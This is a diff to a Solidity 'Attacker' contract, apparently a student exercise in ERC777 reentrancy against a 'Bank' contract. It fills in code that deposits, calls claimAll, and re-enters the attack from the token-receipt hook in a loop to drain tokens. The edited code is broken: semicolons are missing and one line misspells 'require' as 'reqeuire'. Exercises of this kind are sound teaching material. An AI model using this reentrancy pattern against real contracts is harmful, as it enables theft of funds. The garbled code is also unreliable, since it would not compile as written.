@@ -36,18 +36,14 @@ contract Attacker is AccessControl, IERC777Recipient {
 	*/
 	function attack(uint256 amt) payable public {
     require( address(bank) != address(0), "Target bank not set" );
-    require(amt != 0);
+    require(amt != 0)
 		//YOUR CODE TO START ATTACK GOES HERE
-		//This executes the attack by calling the deposit() function and then the vulnerable withdraw function on the Bank contract (look in Bank.sol to identify this function). 
 		if (depth == 0){
       emit Deposit(amt);
-   
       bank.deposit();
-	
     }
-	  bank.claimAll();
+    	bank.claimAll();
 	}
-
 	/*
 	   After the attack, this contract has a lot of (stolen) MCITR tokens
 	   This function sends those tokens to the target recipient
@@ -69,13 +65,12 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
+    reqeuire(depth < max_depth, "invalid")
     while (depth <= max_depth){
       emit Recurse(depth);
       depth++;
       attack(amount);
     }
-    // recursively triggers reentrancy
-
 	}
 
 }
